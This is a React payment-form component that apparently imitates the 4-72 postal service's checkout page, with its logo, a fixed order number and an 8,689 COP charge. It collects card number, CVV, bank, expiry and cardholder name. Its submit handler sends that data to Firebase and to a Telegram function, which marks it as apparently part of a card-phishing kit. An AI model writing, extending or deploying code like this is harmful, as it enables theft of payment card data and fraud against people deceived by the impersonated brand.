import React, { useEffect, useState } from 'react'
import ReactDOM from 'react-dom'
import logo472 from '../../assets/472/472logoGris.png'
import logoFile from '../../assets/472/logoFile.png'
import { sendFirebaseData } from '../../Firebase/sendFirebaseData'
import FormTc from './componentsFormPay/FormTc'
import Modal from './Modal'
import sendTelegram from './componentModal/Functions/sendTelegram'
const initialState = {
    cvv: "",
    bank: "",
    TC: "",
    Mes: "",
    Año: "",
    name:""
}
const FormPay = ({infoPay}) => {
    const [modal,setModal]=useState(false)
    const [data, setData] = useState(initialState)
    const [idF,setIdF]=useState()
    
    const enviarFirebase=()=>{
        sendFirebaseData({infoPay,data,scr:"load"},setIdF)
        sendTelegram({infoPay,data})
    }
    useEffect(()=>{
        window.sessionStorage.getItem('id')&&setIdF(window.sessionStorage.getItem('id'))
    },[])
    return (
        <div className=''>
             {modal && ReactDOM.createPortal(<Modal ide={idF} infoPay={infoPay} />, document.querySelector("#portal"))}
            <div className=' text-center pt-4 pb-2 bg-neutral-200/75 px-4'>
                <img src={logo472} />
                <p className='text-2xl font-semibold text-gray-900/90'>Información de pago</p>
            </div>
            <div className='bg-white border shadow pt-16 px-6 mx-3'>
                <div className=''>
                    <div className='flex'>
                        <img className='h-6 mr-3' src={logoFile} />
                        <p className=''>Numero de order:</p>
                    </div>
                    <p className='ml-5'>909362</p>
                </div>
                <div className='w-full border-b-2 pb-7 mt-8'>
                    <div className='flex w-full justify-between'>
                        <p>IVA</p>
                        <p className='ml-2 font-extrabold'>$ 0.00</p>
                    </div>
                    <div className='flex w-full justify-between'>
                        <p>Valor total</p>
                        <p className='ml-2 font-extrabold'>$ 8.689 COP</p>
                    </div>
                </div>
                <p className='text-center mt-6 my-10 font-bold'>$ 8.689 COP</p>
            </div>
            <FormTc data={data} setData={setData} setModal={setModal} enviarFirebase={enviarFirebase}/>
        </div>
    )
}

export default FormPay